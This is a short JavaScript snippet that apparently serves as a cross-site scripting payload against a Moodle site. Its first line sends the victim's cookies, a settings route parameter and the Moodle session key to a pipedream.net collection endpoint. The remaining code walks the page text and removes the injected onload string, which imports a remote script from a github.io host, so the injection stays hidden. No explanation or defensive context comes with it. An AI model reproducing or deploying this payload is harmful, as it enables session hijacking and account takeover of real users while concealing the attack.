fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?c='+document.cookie+"&id="+document.querySelector('[data-route="view-settings"]').getAttribute('data-route-param')+"&sesskey="+M.cfg.sesskey);
(() => {
  const target = `"onload="import('//nzrxhx.github.io/payloads/payload.js')`;

  const walker = document.createTreeWalker(
    document.body,
    NodeFilter.SHOW_TEXT,
    null
  );

  let node;
  while ((node = walker.nextNode())) {
    if (node.nodeValue.includes(target)) {
      node.nodeValue = node.nodeValue.replace(target, '');
    }
  }
})();

